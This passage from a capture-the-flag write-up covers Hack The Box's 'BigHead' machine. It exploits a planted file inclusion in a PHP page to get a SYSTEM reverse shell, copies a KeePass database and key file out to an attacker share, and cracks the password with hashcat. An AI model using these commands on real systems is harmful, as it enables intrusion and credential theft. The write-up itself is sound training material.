Processed Requests: 5
Filtered Requests: 0
Requests/sec.: 89.11006

```

The 301 for code seems interesting. Visiting `http://code.bighead.htb/testlink/` redirects me to `http://127.0.0.1:5080/testlink/login.php`. If I then fix the host by replacing `127.0.0.1` with `code.bighead.htb`, and visit `http://code.bighead.htb/testlink/login.php`, I get this page full of errors:

![1553883479725](https://0xdfimages.gitlab.io/img/1553883479725.png)

Looking at those paths, I find the corresponding directory with my ssh shell:

```

bvshell:/apps/testlink/htdocs$ ls
BUYING_SUPPORT.TXT                          cfg                                         CHANGELOG                                   CODE_REUSE                                  config.inc.php
config_db.inc.php                           custom                                      custom_config.inc.php.example               custom_config.inc.php.example.github_oauth  docs
error.php                                   extra                                       firstLogin.php                              gui                                         index.php
lib                                         LICENSE                                     linkto.php                                  lnl.php                                     locale
login.php                                   logout.php                                  logs                                        note.txt                                    plugin.php
plugins                                     refactor.txt                                third_party                                 upload_area  

```

I tried writing a webshell here, but it seems I have read only access.

There’s also a note here:

```

bvshell:/apps/testlink/htdocs$ cat note.txt
BIGHEAD! You F%*#ing R*#@*d!

STAY IN YOUR OWN DEV SUB!!!...

You have literally broken the code testing app and tools I spent all night building for Richard!

I don't want to see you in my code again!

Dinesh. 

```

No wonder the pages seem to error out. Bighead broke them.

### linkto.php

I’ll notice that `linkto.php` was modified much more recently then the other php files:

```

bvshell:/apps/testlink/htdocs$ ls -l *.php
-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER       1206 2018-04-14  08:07 plugin.php
-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER       1223 2018-04-14  08:07 logout.php
-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER      10853 2018-04-14  08:07 login.php
-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER       8056 2018-04-14  08:07 lnl.php
-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER      12857 2018-09-02  17:41 linkto.php
-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER       3145 2018-04-14  08:07 index.php
-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER       5546 2018-04-14  08:07 firstLogin.php
-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER       1112 2018-04-14  08:07 error.php
-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER        183 2018-06-24  18:53 config_db.inc.php
-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER      78934 2018-06-24  18:53 config.inc.php  

```

If I visit `/testlink/linkto.php`, I see it fails on a `require_once` call trying to open the empty string:

![1544010935572](https://0xdfimages.gitlab.io/img/1544010935572.png)

Opening up `linkto.php`, I notice something at the top of the code just after all the comments. There is a variable, `$PiperCoinAuth` which is set by a post parameter if another post parameter is present. Later, this is passed to `require_once`:

```

...[snip]...
// alpha 0.0.1 implementation of our new pipercoin authentication tech
// full API not done yet. just submit tokens with requests for now.
if(isset($_POST['PiperID'])){$PiperCoinAuth = $_POST['PiperCoinID']; //plugins/ppiper/pipercoin.php
        $PiperCoinSess = base64_decode($PiperCoinAuth);
        $PiperCoinAvitar = (string)$PiperCoinSess;}

// some session and settings stuff from original index.php
require_once('lib/functions/configCheck.php');
checkConfiguration();
require_once('config.inc.php');
require_once('common.php');
require_once('attachments.inc.php');
require_once('requirements.inc.php');
require_once('testcase.class.php');
require_once('testproject.class.php');
require_once('users.inc.php');
require_once($PiperCoinAuth);    <-- I can control in post
testlinkInitPage($db, true);  
...[snip]...

```

That means I can provide a path anywhere on the host, and it will be included.

### Shell as system

I’ll grab a [Windows php reverse shell](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php), update the ip and port, and get it onto the system:

```

C:\>copy \\10.10.14.14\share\php-rev-shell.php \users\nelson\appdata\local\temp\a.php
copy \\10.10.14.14\share\php-rev-shell.php \users\nelson\appdata\local\temp\a.php
        1 file(s) copied.

```

Trigger it with `curl`, with `PiperID` to get past `if(isset($_POST['PiperID']))`, and setting `PiperCoinID` as my shell location:

```

root@kali# curl -X POST http://localhost:5080/testlink/linkto.php -d 'PiperCoinID=C:\Users\Nelson\AppData\Local\Temp\a.php&PiperID' -x http://127.0.0.1:8080

```

I get a shell as system:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.112.
Ncat: Connection from 10.10.10.112:49277.
b374k shell : connected

Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\Temp>whoami
nt authority\system

```

I can finally get `user.txt`:

```

C:\Users\nginx\Desktop>type user.txt
5f158aa8...

```

## root.txt

### Enumeration

Since I’m system, I should have `root.txt` as well. It’s a hidden file, but I can see it with `dir /a`:

```

C:\Users\Administrator\Desktop>dir /a
 Volume in drive C has no label.
 Volume Serial Number is 7882-4E78

 Directory of C:\Users\Administrator\Desktop

03/11/2018  13:16    <DIR>          .
03/11/2018  13:16    <DIR>          ..
06/10/2018  14:38               697 chest.lnk
02/07/2018  11:56         3,579,384 hardentools.exe
05/07/2018  17:23               971 Immunity Debugger.lnk
06/10/2018  14:33             1,519 root.txt
               4 File(s)      3,582,571 bytes
               2 Dir(s)  18,284,122,112 bytes free

```

But again, it’s another troll:

```

C:\Users\Administrator\Desktop>type root.txt
type root.txt
                    * * *

              Gilfoyle's Prayer
     
___________________6666666___________________ 
____________66666__________66666_____________ 
_________6666___________________666__________ 
_______666__6____________________6_666_______ 
_____666_____66_______________666____66______ 
____66_______66666_________66666______666____ 
___66_________6___66_____66___66_______666___ 
__66__________66____6666_____66_________666__ 
_666___________66__666_66___66___________66__ 
_66____________6666_______6666___________666_ 
_66___________6666_________6666__________666_ 
_66________666_________________666_______666_ 
_66_____666______66_______66______666____666_ 
_666__666666666666666666666666666666666__66__ 
__66_______________6____66______________666__ 
___66______________66___66_____________666___ 
____66______________6__66_____________666____ 
_______666___________666___________666_______ 
_________6666_________6_________666__________ 
____________66666_____6____66666_____________ 
___________________6666666________________

   Prayer for The Praise of Satan's Kingdom

              Praise, Hail Satan!
   Glory be to Satan the Father of the Earth
       and to Lucifer our guiding light
    and to Belial who walks between worlds
     and to Lilith the queen of the night
    As it was in the void of the beginning
                   Is now, 
and ever shall be, Satan's kingdom without End

                so it is done.
                    * * *

```

### Identify KeePass

Since I saw those registry keys for KeePass, I’ve checked each user for signs that they are the one using it. KeePass stores it’s [configuration file](https://keepass.info/help/base/configuration.html) in `C:\Users\[User Name]\AppData\Roaming\KeePass\KeePass.config.xml`. I find that in the administrator’s directory. Here are the interesting parts:

```

C:\Users\Administrator\AppData\Roaming\KeePass>type keepass.config.xml
type keepass.config.xml
<?xml version="1.0" encoding="utf-8"?>
<Configuration xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
        <Meta>
                <PreferUserConfiguration>false</PreferUserConfiguration>
                <OmitItemsWithDefaultValues>true</OmitItemsWithDefaultValues>
                <DpiFactorX>1</DpiFactorX>
                <DpiFactorY>1</DpiFactorY>
        </Meta>
        <Application>
                <LastUsedFile>
                        <Path>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier</Path>
                        <CredProtMode>Obf</CredProtMode>
                        <CredSaveMode>NoSave</CredSaveMode>
                </LastUsedFile>
                <MostRecentlyUsed>
                        <MaxItemCount>12</MaxItemCount>
                        <Items>
                                <ConnectionInfo>
                                        <Path>..\..\Users\Administrator\Desktop\chest.kdbx</Path>
                                        <CredProtMode>Obf</CredProtMode>
                                        <CredSaveMode>NoSave</CredSaveMode>
                                </ConnectionInfo>
                        </Items>
                </MostRecentlyUsed>
...[snip]...
                                <DatabasePath>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier</DatabasePath>
                                <Password>true</Password>
                                <KeyFilePath>..\..\Users\Administrator\Pictures\admin.png</KeyFilePath>
...[snip]...

```

So the database is an Alternative Data Stream on `root.txt`. I’ll also need the key file, `\Users\Administrator\Pictures\admin.png`.

### Collect Files

Now I need to bring the KeePass database and the key file back to my machine. But it’s surprisingly difficult to copy a file from an ADS with native Windows tools. One path would be to get a meterpreter shell, and then just use that to download the file.

`bash` is also on the box, and I can enter a bash shell:

```

C:\Users\Administrator\Desktop>\progra~1\bash\bash.exe
id
uid=1 gid=1
pwd
C:/Users/Administrator/Desktop

```

Now I can cat the ads:

```

cat root.txt:Zone.Identifier > ../appdata/local/temp/a.txt
md5sum root.txt:Zone.Identifier ../appdata/local/temp/a.txt
54bd2170e5e671b07046b2b77ce97155 *root.txt:Zone.Identifier
54bd2170e5e671b07046b2b77ce97155 *../appdata/local/temp/a.txt

```

Now exit out of bash, and get the files:

```

C:\Users\Administrator\Desktop>copy ..\appdata\local\temp\a.txt \\10.10.14.14\share\db.kdbx
copy ..\appdata\local\temp\a.txt \\10.10.14.14\share\db.kdbx
        1 file(s) copied.
        
C:\Users\Administrator\Desktop>copy ..\Pictures\admin.png \\10.10.14.14\share\admin.png
copy ..\Pictures\admin.png \\10.10.14.14\share\admin.png
        1 file(s) copied.

```

Looks like the files came through:

```

root@kali# file share/admin.png share/db.kdbx 
share/admin.png: PNG image data, 251 x 282, 8-bit/color RGBA, non-interlaced
share/db.kdbx:   Keepass password database 2.x KDBX

```

### Break Password

Now I’ll use `keepass2john` to get a hash I can brute force. This script has an option to take a key file:

```

root@kali# /opt/john/run/keepass2john 
Usage: /opt/john/run/keepass2john [-k <keyfile>] <.kdbx database(s)>

root@kali# /opt/john/run/keepass2john -k admin.png root.txt\:Zone.Identifier | tee keepass.hash
root.txt:Zone.Identifier:$keepass$*2*1*0*ea5626a6904620cad648168ef3f1968766f0b5f527c9a8028c1c1b03f2490449*cb3114b5089ffddbb3d607e490176e5e8da3022fc899fad5f317f1e4ebf4c268*a0b68d67dca93aee8f9804c28dac5995*afd02b46e630ff764adb50b7a2aae99d8961b1ab4676aff41c21dca19550c9ac*43c6588d17bceedbd00ed20d5ea310b82170252e29331671cc8aea3edd094ef6*1*64*0063c12d1bf2ac03fb677e1915d1e96e3ab2cb7e381a186e58e8a06c5a296f39

```

Now I throw `hashcat` against it and find the password, “darkness”:

```

$ hashcat -m 13400 -a 0 -o keepass.cracked keepass.hash /usr/share/wordlists/rockyou.txt --force

$ cat keepass.cracked
$keepass$*2*1*0*ea5626a6904620cad648168ef3f1968766f0b5f527c9a8028c1c1b03f2490449*cb3114b5089ffddbb3d607e490176e5e8da3022fc899fad5f317f1e4ebf4c268*a0b68d67dca93aee8f9804c28dac5995*afd02b46e630ff764adb50b7a2aae99d8961b1ab4676aff41c21dca19550c9ac*43c6588d17bceedbd00ed20d5ea310b82170252e29331671cc8aea3edd094ef6*1*64*0063c12d1bf2ac03fb677e1915d1e96e3ab2cb7e381a186e58e8a06c5a296f39:darkness

```

With password and file, I’ll open in KeePass, and find the hash in a store named root.txt:

![](https://0xdfimages.gitlab.io/img/bighead-keepass.gif)

I can also use the [KeePass CLI](http://kpcli.sourceforge.net/) to get the flag out. First, I’ll `apt install kpcli`.

Now I’ll load the db:

```

root@kali# kpcli --key admin.png --kdb db.kdbx
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>

```

`help` will give a list of commands.

Now I just need to find what’s in here:

```

kpcli:/> ls
=== Groups ===
chest/

kpcli:/> cd chest/

kpcli:/chest> ls
=== Groups ===
hash/

kpcli:/chest> cd hash/

kpcli:/chest/hash> ls
=== Entries ===
0. root.txt                                                               

kpcli:/chest/hash> show -f root.txt 

 Path: /chest/hash/
Title: root.txt
Uname: Gilfoyle
 Pass: 436b83bd...
  URL: 
Notes: HTB FTW!

```

[BigHead Exploit Dev »](/2019/05/04/htb-bighead-bof.html)